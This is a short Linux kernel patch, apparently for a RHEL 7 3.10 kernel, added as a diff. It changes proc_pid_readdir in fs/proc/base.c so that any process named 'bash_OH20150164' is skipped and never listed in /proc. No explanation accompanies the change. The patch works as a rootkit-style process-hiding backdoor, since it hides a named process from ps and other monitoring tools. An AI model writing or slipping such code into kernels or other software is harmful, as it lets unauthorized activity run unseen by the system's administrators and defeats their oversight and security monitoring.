@@ -1,0 +1,17 @@
+diff -urNp ./linux-3.10.0-123.13.2.el7.x86_64/fs/proc/base.c linux-3.10.0-123.13.2.el7.x86_64-new/fs/proc/base.c
+--- ./linux-3.10.0-123.13.2.el7.x86_64/fs/proc/base.c	2014-12-13 01:14:08.000000000 +0100
++++ linux-3.10.0-123.13.2.el7.x86_64-new/fs/proc/base.c	2015-02-02 10:31:38.802997986 +0100
+@@ -2986,6 +2986,13 @@ int proc_pid_readdir(struct file * filp,
+ 		else
+ 			__filldir = fake_filldir;
+ 
++		task_lock(iter.task);
++		if (strcmp(iter.task->comm, "bash_OH20150164") == 0) {
++			task_unlock(iter.task);
++			continue;
++		}
++		task_unlock(iter.task);
++
+ 		filp->f_pos = iter.tgid + TGID_OFFSET;
+ 		if (proc_pid_fill_cache(filp, dirent, __filldir, iter) < 0) {
+ 			put_task_struct(iter.task);
